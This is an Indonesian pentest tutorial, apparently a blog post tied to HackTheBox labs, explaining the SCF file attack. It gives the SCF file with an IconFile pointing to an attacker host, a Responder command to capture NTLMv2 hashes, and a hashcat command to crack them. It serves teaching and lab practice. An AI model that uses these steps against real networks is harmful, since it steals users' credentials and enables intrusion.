---
title: 'SCF File Attack'
date: 2022-04-10 16:00:22 +0700
categories: [Windows, Pentest]
tags: [windows, phishing, scf, responder, poisoning, hashcat, initial access]     # TAG names should always be lowercase
author: nairpaa
---

Bukan hal baru bahwa file **SCF (*Shell Command Files*)** dapat digunakan untuk melakukan serangakaian perintah Windows Explorer yang sangat terbatas. 

Dengan kemampuan ini penyerang dapat memanfaatkannya untuk mendapatkan [NTLMv2](/posts/llmnr-poisoning/) atau bahkan [SMB Relay Attack](/posts/smb-relay/).

#### Contoh Lab yang menggunakan skenario serangan ini:
- HackTheBox - Sizzle
- HackTheBox - Driver

## Tahap Eksploitasi

### Step 1: Temukan File Share untuk Upload File

Permata-tama temukan terlebih dahulu target file share yang dapat kita upload file SCF. 

Pada contoh kali ini, direktori `Users/Public` dapat diakses oleh **SMB NULL Session**.

![Memeriksa Hak Akses SMB Share](/assets/img/posts/scf-attack/1.png)


### Step 2: Buat File SCF

Setelah mendapatkan tempat yang bisa di-upload file, selanjutnya buat file SCF seperti berikut dan upload ke file share target.

```bash
➜ cat @nairpaa.scf 
[Shell]
Command=2
IconFile=\\<ip-attacker>\share\test.ico
[Taskbar]
Command=ToggleDesktopv
```

> File SCF menggunakan ekstensi `.scf`. Dan penamaan file yang diawali `@` dilakukan agar file berada di posisi atas pada share drive.
{: .prompt-note }

![Upload SCF File ke SMB Share](/assets/img/posts/scf-attack/2.png)

### Step 3: Jalankan Responsder

Setelah itu jalankan responsder dan tunggu korban mengakses share tersebut untuk mendapatkan hash NTLMv2.

```bash
➜ sudo responder -I eth0 -rdw
```

![Mendapatkan NTLMv2 hash](/assets/img/posts/scf-attack/2.png)

### Step 4: Crack The Hash

```bash
➜ hashcat -m 5600 pass.hash /usr/share/wordlists/rockyou.txt
```

> Serangan ini bisa juga digunakan untuk SMB Relay Attack](/posts/smb-relay/).
{: .prompt-note }

---

## Referensi

- https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/